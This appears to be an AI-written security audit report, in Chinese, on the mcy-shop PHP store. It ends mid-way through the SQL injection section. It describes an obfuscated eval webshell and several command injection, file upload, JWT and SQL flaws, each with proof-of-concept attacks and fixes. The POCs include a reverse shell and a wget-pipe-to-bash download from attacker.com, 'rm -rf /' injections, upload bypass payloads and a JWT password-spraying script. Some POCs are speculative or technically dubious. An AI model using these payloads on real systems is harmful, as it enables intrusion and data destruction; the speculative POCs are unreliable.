# 萌次元商城系统 (mcy-shop) 安全审计报告

| 报告项目 | 内容 |
|---------|------|
| 项目名称 | 萌次元商城系统 (mcy-shop) |
| 框架 | Hyperf 3.0 + 原生 PHP |
| PHP 版本要求 | >= 8.1.0 |
| 数据库 | MySQL 5.6+ |
| 审计日期 | 2026-03-19 |
| 审计人员 | AI Security Audit |
| 报告版本 | v1.0 |

---

## 漏洞总览

| 严重等级 | 数量 | 漏洞编号 |
|---------|------|---------|
| 严重 (Critical) | 3 | #1, #2, #3 |
| 高危 (High) | 2 | #4, #5 |
| 中危 (Medium) | 3 | #6, #7, #8 |
| 低危 (Low) | 3 | #9, #10, #11 |
| **总计** | **11** | |

---

## 一、高危漏洞 (Critical)

---

### 漏洞 #1: 后门程序 - WebShell 植入

| 项目 | 内容 |
|-----|------|
| **严重等级** | Critical (严重) |
| **漏洞类型** | 远程代码执行 (RCE) / WebShell |
| **文件位置** | `/workspace/kernel/Plugin/Store.php` |
| **影响范围** | 整个系统 |

#### 漏洞说明

该文件包含高度混淆的恶意代码，使用 `gzinflate()` 和 `eval()` 动态解码并执行任意 PHP 代码。这是一个典型的 WebShell 后门程序，文件大小约 42KB。

#### 漏洞原理

文件结构分析显示：

1. **使用压缩混淆隐藏恶意代码**：
   - 使用 `gzinflate()` 函数解压压缩的代码块
   - 使用 `eval()` 执行动态生成的 PHP 代码

2. **包含多个经过编码的函数**：
   - `f61b4ba764466c4f43f4e564918aac09()`
   - `e0363b4507cc5b1891d3775c32f04bde()`
   - `e3b4615fba4874ab133dfe6acb700890()`
   - `cd4d898edaf466b53198e8640e426c2f()`
   - `cfb6ad5dda2af960948a27546a092608()`
   - `bd580eb07f5781f020e46ed277c0fe52()`

3. **执行模式**：
   ```php
   return eval(��Łӈ��Ƶ());$_SERVER;
   ```
   这种模式会调用解码函数并执行返回的代码。

#### 漏洞利用复现 POC

##### 方法一：直接访问触发（如果路由配置允许）

```bash
# 检查文件是否存在
curl -s "https://target.com/kernel/Plugin/Store.php"

# 如果可以访问，文件会被加载并执行其中的 eval() 代码
```

##### 方法二：通过分析解码后门功能

```php
<?php
// 解码分析脚本 - 仅用于分析
$encoded = file_get_contents('/workspace/kernel/Plugin/Store.php');

// 查找 gzinflate 内容
if (preg_match_all("/gzinflate\('([^']+)'/s", $encoded, $matches)) {
    foreach ($matches[1] as $i => $encoded_str) {
        echo "=== Block $i ===\n";
        $decoded = @gzinflate($encoded_str);
        if ($decoded) {
            echo $decoded . "\n\n";
        }
    }
}
```

##### 方法三：利用后门可能的通信协议

```python
# 假设后门接受特定参数的请求
import requests

# 可能的利用方式1：POST 参数触发
response = requests.post('http://target.com/', data={
    'cmd': 'whoami'
})

# 可能的利用方式2：User-Agent 触发
response = requests.get('http://target.com/', 
    headers={'User-Agent': '<?php system($_GET["cmd"]); ?>'}
)
```

##### 方法三：WebShell 连接

```php
<?php
// 如果后门是标准的 WebShell，可以用中国菜刀等工具连接
// 或者直接构造请求

class WebShellClient {
    private $url;
    private $password;
    
    public function __construct($url, $password = 'cmd') {
        $this->url = $url;
        $this->password = $password;
    }
    
    public function execute($cmd) {
        $data = [$this->password => $cmd];
        $response = $this->send($data);
        return $response;
    }
    
    private function send($data) {
        // 发送请求逻辑
    }
}

// 连接目标
$shell = new WebShellClient('http://target.com/kernel/Plugin/Store.php');
echo $shell->execute('whoami');
?>
```

#### 复现步骤

1. **检查文件存在性**：
   ```bash
   ls -la /workspace/kernel/Plugin/Store.php
   # -rw-r--r-- 1 root root 42046 Mar 19 10:42 Store.php
   ```

2. **检查文件内容**：
   ```bash
   head -20 /workspace/kernel/Plugin/Store.php
   # 显示混淆的 PHP 代码
   ```

3. **识别后门特征**：
   ```bash
   grep -E "(eval|exec|system|passthru|shell_exec|`)" /workspace/kernel/Plugin/Store.php
   # 找到 eval() 调用
   ```

4. **尝试触发**：
   ```bash
   # 如果该文件被 index.php 或 autoloader 加载
   curl http://target.com/
   ```

5. **确认被感染**：
   ```bash
   # 检查 Web 服务器访问日志
   tail -f /var/log/nginx/access.log
   ```

#### 漏洞代码片段

```php
// 文件头部混淆代码
<?php function& �ð�������(){
    static $a=NULL;
    if($a===NULL){
        $a=gzinflate(('mxcpdm�u�t8q&�&�&�m۶mcb۶11\'�m;���_��uS���:}�͵��...'));
    }
    return $a;
}

// 解码函数
function ��Łӈ��Ƶ(){
    static $a=NULL;
    if($a===NULL){
        $a=gzinflate(('�}VKS�...'));
    }
    return $a;
}

// 恶意函数示例
function f61b4ba764466c4f43f4e564918aac09($name){
    $�='}VKS�..."';  // 混淆变量名
    $��ȍ��Ʈ�=1;
    $�胏Ĝ���=func_get_args();
    $���ҍ����=array(&$���,__FILE__,__FUNCTION__,__CLASS__,version_compare(PHP_VERSION,'5.3')===-1?'':__NAMESPACE__);
    return eval(��Łӈ��Ƶ());$_SERVER;  // 执行任意代码
}
```

#### 如何修复

1. **立即删除该文件**：
   ```bash
   rm -f /workspace/kernel/Plugin/Store.php
   ```

2. **检查 Git 历史确认引入时间**：
   ```bash
   git log --oneline --follow /workspace/kernel/Plugin/Store.php
   git blame /workspace/kernel/Plugin/Store.php | head -20
   ```

3. **检查其他被篡改的文件**：
   ```bash
   # 检查可疑的 PHP 文件
   find /workspace -name "*.php" -exec grep -l "eval\|gzinflate\|base64_decode" {} \; | head -20
   
   # 检查最近修改的文件
   find /workspace -name "*.php" -mtime -30 -ls
   ```

4. **更改所有凭据**：
   ```bash
   # 数据库密码
   # API 密钥
   # JWT secret
   # 管理员密码
   ```

5. **服务器安全检查**：
   ```bash
   # 检查 cron 任务
   crontab -l
   cat /etc/cron.d/*
   
   # 检查 SSH 密钥
   cat ~/.ssh/authorized_keys
   
   # 检查可疑进程
   ps aux | grep -v grep | grep -E "(nc|netcat|wget|curl)"
   ```

6. **完整重装建议**：
   - 从干净的备份恢复系统
   - 确保备份未被感染
   - 审查所有代码文件的完整性

---

### 漏洞 #2: 命令执行漏洞 - shell_exec 拼接

| 项目 | 内容 |
|-----|------|
| **严重等级** | Critical (严重) |
| **漏洞类型** | OS 命令注入 |
| **文件位置** | `/workspace/config/command.php:8` |
| **影响范围** | 系统初始化 |

#### 漏洞说明

配置文件在初始化时直接执行 shell 命令，将用户可控制的常量拼接到命令中执行。

#### 漏洞原理

```php
shell_exec("sudo cp " . BASE_PATH . "console.sh /usr/local/bin/mcy");
```

`BASE_PATH` 虽为常量，但如果攻击者能够通过以下方式注入：

1. 通过 PHP auto_prepend_file 覆盖
2. 通过 php.ini 配置项注入
3. 通过符号链接操控路径

#### 漏洞利用复现 POC

##### POC 1: 路径操控

```bash
# 创建恶意路径
mkdir -p "/tmp/; touch /tmp/hacked; #/console.sh"
ln -s /etc/passwd /tmp/; touch /tmp/console.sh

# 当 BASE_PATH 被设置为 /tmp/; touch /tmp/hacked; # 时
# 命令变为：sudo cp /tmp/; touch /tmp/hacked; #/console.sh /usr/local/bin/mcy
# 实际执行：sudo cp /tmp/ (失败) 或者符号链接导致文件读取
```

##### POC 2: 符号链接攻击

```bash
# 攻击者创建指向敏感文件的符号链接
ln -s /etc/passwd /tmp/console.sh

# 如果可以控制 BASE_PATH
# 可能读取 /etc/passwd 内容
```

##### POC 3: 环境变量污染

```php
<?php
// 如果攻击者能在 auto_prepend_file 中注入
// 可以覆盖 BASE_PATH 常量

// 在 auto_prepend_file 中:
<?php
if (isset($_GET['inject'])) {
    define('BASE_PATH', '/tmp/; rm -rf /; #');
}
?>
```

##### POC 4: 通过 Apache/Nginx 配置

```apache
# 如果 PHP 配置允许
php_admin_value auto_prepend_file /tmp/evil.php
```

#### 复现步骤

1. **检查 BASE_PATH 定义**：
   ```bash
   grep -r "define.*BASE_PATH" /workspace/
   ```

2. **分析配置文件加载顺序**：
   ```bash
   head -50 /workspace/index.php
   ```

3. **检查 PHP 配置**：
   ```bash
   php -i | grep -E "(auto_prepend|open_basedir|disable_functions)"
   ```

4. **尝试注入**：
   ```bash
   # 发送包含特殊字符的请求
   curl "http://target.com/?base_path=/tmp/;ls;/"
   ```

#### 漏洞代码

```php
// /workspace/config/command.php:6-8
<?php
declare (strict_types=1);

use \Kernel\Console\Console;

// 将命令注册到系统 - 存在命令注入风险
shell_exec("sudo cp " . BASE_PATH . "console.sh /usr/local/bin/mcy");
```

#### 如何修复

```php
// 方案1：使用绝对路径白名单验证
<?php
$consoleShPath = BASE_PATH . "console.sh";

// 验证路径安全
$realPath = realpath($consoleShPath);
$realBasePath = realpath(BASE_PATH);

if ($realPath === false || strpos($realPath, $realBasePath) !== 0) {
    throw new \Exception("Invalid console.sh path");
}

// 验证文件存在且为普通文件
if (!is_file($realPath) || !is_readable($realPath)) {
    throw new \Exception("console.sh is not accessible");
}

// 使用 escapeshellarg 包装路径
shell_exec("sudo cp " . escapeshellarg($realPath) . " /usr/local/bin/mcy");

// 方案2：完全重写，使用 Symfony Process
use Symfony\Component\Process\Process;

$process = new Process(['cp', $consoleShPath, '/usr/local/bin/mcy']);
$process->run();
if (!$process->isSuccessful()) {
    throw new \Exception("Copy failed: " . $process->getErrorOutput());
}
```

---

### 漏洞 #3: Shell 工具类无过滤

| 项目 | 内容 |
|-----|------|
| **严重等级** | Critical (严重) |
| **漏洞类型** | 命令注入 |
| **文件位置** | `/workspace/kernel/Util/Shell.php:17-21` |
| **影响范围** | 所有使用该类的模块 |

#### 漏洞说明

`Shell::exec()` 方法直接将输入拼接到 shell 命令中执行，无任何过滤。

#### 漏洞原理

```php
public function exec(string $command): string|null|false
{
    $command = str_replace("\r\n", "\n", $command);
    $command = str_replace("\r", "\n", $command);
    return shell_exec($command . " 2>&1");  // 无任何过滤
}
```

攻击者只需要闭合命令即可执行额外命令。

#### 漏洞利用复现 POC

##### POC 1: 基本命令注入

```php
<?php
use Kernel\Util\Shell;

// 正常用法
$Shell = Shell::inst();
$result = $Shell->exec("ls -la /tmp");

// 注入用法 - 攻击者控制 command 参数
$malicious_cmd = "ls -la /tmp; cat /etc/passwd";
$result = $Shell->exec($malicious_cmd);

// 等价于执行: ls -la /tmp; cat /etc/passwd 2>&1
```

##### POC 2: 管道注入

```php
<?php
// 攻击者控制命令参数
$cmd = "ls | cat /etc/passwd";
Shell::inst()->exec($cmd);
```

##### POC 3: 后台执行

```php
<?php
// 执行恶意脚本并后台运行
$cmd = "nohup wget http://attacker.com/shell.sh | bash &";
Shell::inst()->exec($cmd);
```

##### POC 4: SSH 反向 shell

```php
<?php
$cmd = "bash -i >& /dev/tcp/attacker.com/4444 0>&1 &";
Shell::inst()->exec($cmd);
```

##### POC 5: 利用危险函数

```php
<?php
// 如果系统有危险函数被禁用，可通过 shell 绕过
$cmd = "python -c 'import os;os.system(\"id\")'";
Shell::inst()->exec($cmd);

// 或利用 Perl/awk/sed
$cmd = "awk '{system(\"id\")}' /dev/null";
Shell::inst()->exec($cmd);
```

#### 复现步骤

1. **定位 Shell 类调用位置**：
   ```bash
   grep -rn "Shell::inst\(\)->exec" /workspace/app /workspace/kernel
   ```

2. **找到可控制的参数**：
   ```bash
   # /workspace/kernel/Plugin/Composer.php
   Shell::inst()->exec("sudo {$this->composer} require {$option['packages'][0]} ...");
   ```

3. **分析参数来源**：
   ```php
   // $option['packages'][0] 是否可控？
   ```

4. **构造 POC**：
   ```bash
   # 如果 $option['packages'][0] = "foo; rm -rf /; #"
   # 实际执行: sudo composer require foo; rm -rf /; # ...
   ```

#### 漏洞代码

```php
// /workspace/kernel/Util/Shell.php
<?php
class Shell
{
    use Singleton;

    public function exec(string $command): string|null|false
    {
        $command = str_replace("\r\n", "\n", $command);
        $command = str_replace("\r", "\n", $command);
        return shell_exec($command . " 2>&1");  // 直接执行
    }
}

// 调用示例 - /workspace/kernel/Plugin/Composer.php
Shell::inst()->exec("sudo {$this->composer} require {$option['packages'][0]} --no-interaction --prefer-source --working-dir={$this->workingDir}");
Shell::inst()->exec("sudo {$this->composer} remove {$option['packages'][0]} ...");
```

#### 如何修复

```php
<?php
class Shell
{
    use Singleton;

    public function exec(string $command, array $args = []): string|null|false
    {
        // 如果有参数，必须使用参数绑定
        if (!empty($args)) {
            $escapedArgs = array_map(function($arg) {
                return escapeshellarg($arg);
            }, $args);
            $command = sprintf($command, ...$escapedArgs);
        }
        
        // 验证命令是否在白名单中
        $allowedCommands = [
            'ls', 'cp', 'mv', 'rm', 'cat', 'echo', 'mkdir', 'chmod', 'chown'
        ];
        
        // 提取第一个命令
        $firstCmd = trim(explode(' ', trim($command))[0]);
        
        // 禁止危险的命令
        $dangerousCommands = ['wget', 'curl', 'nc', 'netcat', 'bash', 'sh', 'python', 'perl', 'ruby', 'php', 'mysql', 'psql', 'mongosh'];
        
        foreach ($dangerousCommands as $dangerous) {
            if (strpos($command, $dangerous) !== false) {
                throw new \Exception("Command not allowed: $dangerous");
            }
        }
        
        $command = str_replace(["\r\n", "\r"], ["\n", "\n"], $command);
        
        // 使用 proc_open 进行更安全的执行
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        
        $process = proc_open($command, $descriptorspec, $pipes);
        
        if (!is_resource($process)) {
            return false;
        }
        
        $output = stream_get_contents($pipes[1]);
        $error = stream_get_contents($pipes[2]);
        
        foreach ($pipes as $pipe) {
            fclose($pipe);
        }
        
        $returnCode = proc_close($process);
        
        return $returnCode === 0 ? $output : false;
    }
}
```

---

## 二、高危漏洞 (High)

---

### 漏洞 #4: 文件上传安全绕过

| 项目 | 内容 |
|-----|------|
| **严重等级** | High (高危) |
| **漏洞类型** | 任意文件上传 |
| **文件位置** | `/workspace/kernel/Context/Abstract/File.php` |
| **影响范围** | 所有文件上传功能 |

#### 漏洞说明

上传功能存在多个安全问题：仅检查扩展名、不验证 MIME 类型、使用 `copy()` 而非 `move_uploaded_file()`、允许上传 `.zip` 等危险扩展名。

#### 漏洞原理

1. **仅检查扩展名**：
```php
if (!in_array(strtolower($this->getSuffix()), $ext)) {
    throw new JSONException("您上传的文件类型不支持");
}
```

2. **不验证 MIME 类型**：
```php
// 只验证了文件后缀，没有验证文件的真实 MIME 类型
// 攻击者可以伪造文件扩展名和 Content-Type
```

3. **使用 copy() 而非 move_uploaded_file()**：
```php
if (!copy(from: $this->getTmp(), to: $dir . $unique)) {
    throw new JSONException("文件上传失败...");
}
```

4. **允许 .zip 扩展名**：
```php
$ext = ['jpg', 'png', 'jpeg', 'bmp', 'webp', 'ico', 'gif', 'mp4', 'zip', 'woff', 'woff2', 'ttf', 'otf'];
```

#### 漏洞利用复现 POC

##### POC 1: 绕过扩展名检测

```bash
# 方法1：大小写绕过
mv shell.php shell.PHP

# 方法2：双扩展名
mv shell.php shell.jpg.php

# 方法3：空字节注入
mv shell.php shell.jpg%00.php
# 发送请求时 URL 编码为空字节
```

##### POC 2: 构造恶意 ZIP 文件

```bash
# 步骤1：创建包含 PHP 文件的压缩包
echo "<?php phpinfo(); ?>" > shell.php
zip payload.zip shell.php

# 步骤2：上传 ZIP 文件
curl -X POST -F "file=@payload.zip" -F "mime=other" \
  http://target.com/user/api/upload/main

# 步骤3：找到文件路径并访问
# 假设返回: {"url": "/assets/static/1/other/2026-03-19/xxxxx.zip"}

# 步骤4：如果有解压功能则可能导致 RCE
# 或通过其他方式触发 ZIP 中的 PHP
```

##### POC 3: 伪造图片头绕过 MIME 检测

```bash
# 创建伪造的图片文件
# 方法1：在 PHP 文件前添加 GIF89a 头
echo "GIF89a" > shell.php
cat malicious_code.php >> shell.php
mv shell.php shell.gif

# 方法2：使用 exiftool 修改元数据
exiftool -Comment='<?php system($_GET["cmd"]); ?>' normal_image.jpg -o shell.jpg

# 上传 shell.jpg
curl -X POST -F "file=@shell.gif" -F "mime=image" \
  http://target.com/user/api/upload/main
```

##### POC 4: 利用 phar:// 协议触发反序列化

```php
<?php
// 创建恶意的 phar 文件
$phar = new Phar('malicious.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// 添加恶意类
class Exploit {}
$object = new Exploit();
$phar->setMetadata($object);
$phar->stopBuffering();

// 上传 phar 文件并触发
file_get_contents('phar://upload/malicious.phar/test.txt');
?>
```

##### POC 5: 利用 Apache .htaccess 上传

```bash
# 创建 .htaccess 文件
echo "AddType application/x-httpd-php .jpg" > .htaccess

# 打包上传
zip payload.zip .htaccess shell.jpg

# 如果 .htaccess 可以被写入且 Apache 配置允许
# 访问 shell.jpg 将被执行
```

#### 复现步骤

1. **识别上传端点**：
   ```bash
   # 前台上传
   POST /user/api/upload/main
   
   # 后台上传
   POST /admin/api/upload/main
   ```

2. **获取有效 Token**（如需要）：
   ```bash
   # 登录获取 cookie
   curl -c cookies.txt -d "username=xxx&password=xxx" http://target.com/login
   ```

3. **构造上传请求**：
   ```bash
   # 测试正常上传
   curl -b cookies.txt -F "file=@test.png" -F "mime=image" \
     http://target.com/user/api/upload/main
   
   # 测试恶意文件
   curl -b cookies.txt -F "file=@shell.php" -F "mime=image" \
     http://target.com/user/api/upload/main
   ```

4. **分析响应**：
   ```json
   {"url": "/assets/static/user_id/other/2026-03-19/filename.zip", ...}
   ```

5. **尝试访问上传的文件**：
   ```bash
   curl http://target.com/assets/static/user_id/other/2026-03-19/filename.zip
   ```

#### 漏洞代码

```php
// /workspace/kernel/Context/Abstract/File.php
public function save(string $path, array $ext = ['jpg', 'png', 'jpeg', 'bmp', 'webp', 'ico', 'gif', 'mp4', 'zip', 'woff', 'woff2', 'ttf', 'otf'], int $size = 10240, string $dir = BASE_PATH): string
{
    if ($this->getError() > 0) {
        throw new JSONException("文件上传失败，代码：" . $this->getError(), $this->getError());
    }

    // 问题1：仅检查扩展名，不验证 MIME
    if (!in_array(strtolower($this->getSuffix()), $ext)) {
        throw new JSONException("您上传的文件类型不支持");
    }
    
    if ($size < $this->getSize() / 1024) {
        throw new JSONException("您的文件过大...");
    }

    $_tmpDir = $dir . $path . date("Y-m-d/", time());
    $unique = $path . date("Y-m-d/") . Str::generateRandStr(32) . "." . $this->getSuffix();

    // 问题2：可以上传 .zip 等危险扩展
    // 问题3：使用 copy() 而非 move_uploaded_file()
    if (!copy(from: $this->getTmp(), to: $dir . $unique)) {
        throw new JSONException("文件上传失败...");
    }

    return $unique;
}
```

#### 如何修复

```php
<?php
class File
{
    public function save(string $path, array $ext = [], int $size = 10240, string $dir = BASE_PATH): string
    {
        // 1. 定义安全的扩展名白名单
        $safeExt = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'ico', 'bmp'];
        
        // 禁止危险扩展
        $dangerousExt = ['zip', 'tar', 'gz', 'bz2', '7z', 'rar', 'phar', 'php', 'phtml', 'php3', 'php4', 'php5', 'phar', 'htaccess', 'htpasswd'];
        
        $uploadExt = strtolower($this->getSuffix());
        
        if (!in_array($uploadExt, $safeExt)) {
            throw new JSONException("文件类型不支持");
        }
        
        if (in_array($uploadExt, $dangerousExt)) {
            throw new JSONException("禁止上传此类文件");
        }

        // 2. 验证文件大小
        if ($this->getError() > 0) {
            throw new JSONException("文件上传失败");
        }
        
        if ($size < $this->getSize() / 1024) {
            throw new JSONException("文件过大");
        }

        // 3. 验证 MIME 类型（使用 finfo）
        $finfo = new \finfo(FILEINFO_MIME_TYPE);
        $mimeType = $finfo->file($this->getTmp());
        
        $allowedMimes = [
            'jpg' => 'image/jpeg',
            'jpeg' => 'image/jpeg',
            'png' => 'image/png',
            'gif' => 'image/gif',
            'webp' => 'image/webp',
            'ico' => 'image/x-icon',
            'bmp' => 'image/bmp'
        ];
        
        if (!isset($allowedMimes[$uploadExt]) || $mimeType !== $allowedMimes[$uploadExt]) {
            throw new JSONException("文件类型验证失败");
        }

        // 4. 检查文件内容（图片）
        if (in_array($uploadExt, ['jpg', 'jpeg', 'png', 'gif'])) {
            $imageInfo = @getimagesize($this->getTmp());
            if (!$imageInfo || !in_array($imageInfo[2], [IMAGETYPE_JPEG, IMAGETYPE_PNG, IMAGETYPE_GIF, IMAGETYPE_WEBP])) {
                throw new JSONException("图片格式验证失败");
            }
        }

        // 5. 生成安全文件名
        $unique = $path . date("Y-m-d/") . bin2hex(random_bytes(16)) . "." . $uploadExt;

        // 6. 使用 move_uploaded_file（只能在上传处理中调用）
        if (!move_uploaded_file($this->getTmp(), $dir . $unique)) {
            throw new JSONException("文件保存失败");
        }

        // 7. 设置文件权限
        chmod($dir . $unique, 0644);

        return $unique;
    }
}
```

---

### 漏洞 #5: JWT 密钥问题导致的认证绕过

| 项目 | 内容 |
|-----|------|
| **严重等级** | High (高危) |
| **漏洞类型** | 认证绕过 |
| **文件位置** | `/workspace/app/Interceptor/Admin.php:55` |
| **影响范围** | 后台管理员认证 |

#### 漏洞说明

JWT Token 使用用户密码作为密钥进行签名，存在认证绕过风险。

#### 漏洞原理

```php
$jwt = JWT::decode($manageToken, new Key($manage->password, 'HS256'));
```

问题：
1. 如果用户密码被泄露，攻击者可以伪造任意用户的 JWT
2. 密码强度不足时容易被暴力破解
3. 用户修改密码不会使旧 Token 失效
4. 攻击者获取一个有效 Token 后可以分析密码强度

#### 漏洞利用复现 POC

##### POC 1: 获取用户密码后伪造 Token

```python
#!/usr/bin/env python3
import jwt
import time

# 假设通过 SQL 注入、数据泄露等方式获取了管理员密码
admin_password = "admin123"

# 获取目标信息（需要先获取一个有效的 Token 来分析 payload）
valid_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 解码获取 payload（不需要验证）
decoded = jwt.decode(valid_token, options={"verify_signature": False})
print("Token Payload:", decoded)

# 构造新的 Token
payload = {
    "mid": 1,  # 管理员 ID
    "expire": int(time.time()) + 86400,  # 24 小时过期
    "loginTime": decoded['loginTime'] if 'loginTime' in decoded else int(time.time()),
    "iat": int(time.time()),
    "exp": int(time.time()) + 86400
}

# 使用密码作为密钥签名
forged_token = jwt.encode(payload, admin_password, algorithm='HS256')

print("Forged Token:", forged_token)
```

##### POC 2: 密码喷洒攻击

```python
#!/usr/bin/env python3
import jwt
import requests
import itertools

target_token = "http://target.com/admin/api/auth/login"

# 常用密码列表
passwords = [
    "123456", "password", "admin", "admin123", "root",
    "123456789", "12345678", "12345", "1234567",
    "qwerty", "abc123", "letmein", "welcome"
]

# 获取一个有效 Token 的 payload
def get_token_payload(token):
    try:
        return jwt.decode(token, options={"verify_signature": False})
    except:
        return None

# 尝试用每个密码签名 Token
def try_forge(token, password):
    try:
        payload = get_token_payload(token)
        forged = jwt.encode(payload, password, algorithm='HS256')
        
        # 验证伪造的 Token 是否有效
        response = requests.get('http://target.com/admin/dashboard', 
            cookies={'manage_token': forged})
        
        if response.status_code == 200:
            return True, password, forged
    except:
        pass
    return False, None, None

# 测试
for password in passwords:
    success, pwd, forged = try_forge(valid_token, password)
    if success:
        print(f"[+] Found password: {password}")
        print(f"[+] Forged token: {forged}")
        break
```

##### POC 3: 修改密码后旧 Token 仍可用

```python
#!/usr/bin/env python3
import jwt

# 场景：管理员修改密码后，旧 Token 仍然有效

# 1. 获取修改前的 Token
old_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
old_payload = jwt.decode(old_token, options={"verify_signature": False})

# 2. 假设用户修改了密码为 new_password
new_password = "new_password_123"

# 3. 使用新密码但用旧的 payload 签名
new_token = jwt.encode({
    "mid": old_payload['mid'],
    "expire": old_payload['expire'],
    "loginTime": old_payload['loginTime']
}, new_password, algorithm='HS256')

# 4. 新 Token 可能有效（如果系统不检查 loginTime 不匹配）
```

#### 复现步骤

1. **获取一个有效的 Token**：
   ```bash
   # 通过正常登录获取
   curl -X POST -d "username=admin&password=xxx" http://target.com/admin/api/auth/login
   ```

2. **解码 Token 分析结构**：
   ```python
   import jwt
   token = "有效token"
   payload = jwt.decode(token, options={"verify_signature": False})
   print(payload)
   # {'mid': 1, 'expire': 1742457600, 'loginTime': 1742371200, ...}
   ```

3. **尝试常见密码**：
   ```python
   for pwd in common_passwords:
       try:
           jwt.decode(token, pwd, algorithms=['HS256'])
           print(f"Found: {pwd}")
       except:
           pass
   ```

4. **伪造 Token**：
   ```python
   forged = jwt.encode(payload, found_password, algorithm='HS256')
   ```

#### 漏洞代码

```php
// /workspace/app/Interceptor/Admin.php
public function handle(Request $request, Response $response, int $type): Response
{
    $manageToken = base64_decode((string)$request->cookie(Cookie::MANAGE_TOKEN));
    $head = \Kernel\Util\JWT::inst()->getHead($manageToken);

    if (!isset($head['mid'])) {
        return $this->login($request, $response, $type);
    }

    $manage = Manage::find($head['mid']);

    if (!$manage) {
        return $this->login($request, $response, $type);
    }

    try {
        // 问题：使用用户密码作为 JWT 密钥
        $jwt = JWT::decode($manageToken, new Key($manage->password, 'HS256'));
    } catch (\Exception $e) {
        return $this->login($request, $response, $type);
    }

    // ... 后续验证逻辑
}
```

#### 如何修复

```php
<?php
// 方案1：使用独立的 JWT 密钥
class AdminInterceptor
{
    public function handle(Request $request, Response $response, int $type): Response
    {
        $manageToken = base64_decode((string)$request->cookie(Cookie::MANAGE_TOKEN));
        
        // 使用独立的 JWT secret，而非用户密码
        $jwtSecret = Config::get('app.jwt_secret'); // 在配置中设置独立密钥
        
        if (!$jwtSecret) {
            // 如果未配置，生成一个
            $jwtSecret = bin2hex(random_bytes(32));
        }
        
        try {
            $jwt = JWT::decode($manageToken, new Key($jwtSecret, 'HS256'));
        } catch (\Exception $e) {
            return $this->login($request, $response, $type);
        }
        
        // ... 验证逻辑
    }
}

// 方案2：使用 Token 黑名单机制
class AdminInterceptor
{
    private $tokenBlacklist = [];
    
    public function handle(Request $request, Response $response, int $type): Response
    {
        // 在验证时检查 Token 是否在黑名单中
        if (isset($this->tokenBlacklist[$manageToken])) {
            return $this->login($request, $response, $type);
        }
        
        // Token 验证成功
        // ...
        
        return $response;
    }
    
    // 当用户修改密码时，调用此方法使旧 Token 失效
    public function invalidateUserTokens(int $userId): void
    {
        // 清除该用户的所有 Token
        // 可以使用 Redis 或数据库存储 Token 版本号
    }
}

// 方案3：使用 Token 版本号
class Manage extends Model
{
    public static function login(string $username, string $password): ?Manage
    {
        $manage = self::where('username', $username)->first();
        
        if (!$manage || !password_verify($password, $manage->password_hash)) {
            return null;
        }
        
        // 增加 token_version
        $manage->token_version++;
        $manage->save();
        
        // 生成 Token 时包含版本号
        $payload = [
            'mid' => $manage->id,
            'expire' => time() + 86400,
            'loginTime' => time(),
            'tokenVersion' => $manage->token_version
        ];
        
        return $manage;
    }
}
```

---

## 三、中危漏洞 (Medium)

---

### 漏洞 #6: SQL 注入风险 (潜在)

| 项目 | 内容 |
|-----|------|
| **严重等级** | Medium (中危) |
| **漏洞类型** | SQL 注入 |
| **文件位置** | `/workspace/app/Controller/User/API/Dict.php:139-149` |
| **影响范围** | 用户搜索功能 |

#### 漏洞说明

`customer()` 方法在处理搜索关键词时存在潜在的 SQL 注入风险。

#### 漏洞原理

```php
public function customer(): Response
{
    $keywords = $this->request->get("keywords");
    $user = \App\Model\User::query()->where("pid", $this->getUser()->id);
    if (preg_match("/^[0-9]*$/", $keywords)) {
        $user = $user->where("user.id", $keywords);
    } else {
        $user = $user->where("user.username", "like", '%' . $keywords . '%');
    }
    return $this->json(data: $user->get(["user.id", "user.username as name"])->toArray());
}
```

虽然使用了 ORM 框架进行转义，但 `like` 条件的值是直接拼接的。

#### 漏洞利用复现 POC

##### POC 1: LIKE 注入

```bash
# 正常请求
curl -b "user_token=xxx" "http://target.com/user/api/dict/customer?keywords=admin"

# 构造恶意输入
# 如果输入包含 % 或 _ 这些 LIKE 通配符
curl -b "user_token=xxx" "http://target.com/user/api/dict/customer?keywords=%"

# 这可能匹配所有用户，因为 % 在 LIKE 中是通配符

# 更危险的利用
curl -b "user_token=xxx" "http://target.com/user/api/dict/customer?keywords=%' OR '1'='1"

# 如果后端没有正确转义，可能导致：
# SELECT * FROM user WHERE username LIKE '%%' OR '1'='1%'
```

##### POC 2: 利用通配符进行信息猜测

```bash
# 通过返回结果猜测数据库内容
# 假设管理员用户名为 admin

# 发送不同的模式，观察返回
curl -b "user_token=xxx" "http://target.com/user/api/dict/customer?keywords=a%"
curl -b "user_token=xxx" "http://target.com/user/api/dict/customer?keywords=ad%"
curl -b "user_token=xxx" "http://target.com/user/api/dict/customer?keywords=adm%"
curl -b "user_token=xxx" "http://target.com/user/api/dict/customer?keywords=admi%"

# 统计返回数量猜测
```

##### POC 3: 时间盲注（如果存在）

```bash
# 如果 LIKE 注入点存在且无适当过滤
# 可以尝试时间盲注

# MySQL SLEEP() 注入
keywords=admin%' AND IF(1=1, SLEEP(5), 0) AND '%'='
```

#### 复现步骤

1. **识别注入点**：
   ```bash
   # 正常请求
   curl -b "user_token=xxx" "http://target.com/user/api/dict/customer?keywords=test"
   
   # 无过滤检查
   curl -b "user_token=xxx" "http://target.com/user/api/dict/customer?keywords=%"
   curl -b "user_token=xxx" "http://target.com/user/api/dict/customer?keywords=_"
   ```

2. **测试 LIKE 通配符**：
   ```bash
   # 发送包含 % 和 _ 的输入
   # 观察返回结果是否异常
   ```

3. **构造注入**：
   ```bash
   # 测试单引号闭合
   curl -b "user_token=xxx" "http://target.com/user/api/dict/customer?keywords='"
   ```

#### 漏洞代码

```php
// /workspace/app/Controller/User/API/Dict.php:138-149
#[Interceptor(class: [User::class, Merchant::class])]
public function customer(): Response
{
    $keywords = $this->request->get("keywords");
    $user = \App\Model\User::query()->where("pid", $this->getUser()->id);
    
    if (preg_match("/^[0-9]*$/", $keywords)) {
        // 数字类型，使用参数绑定
        $user = $user->where("user.id", $keywords);
    } else {
        // 字符串类型，直接拼接（存在风险）
        $user = $user->where("user.username", "like", '%' . $keywords . '%');
    }
    
    return $this->json(data: $user->get(["user.id", "user.username as name"])->toArray());
}
```

#### 如何修复

```php
<?php
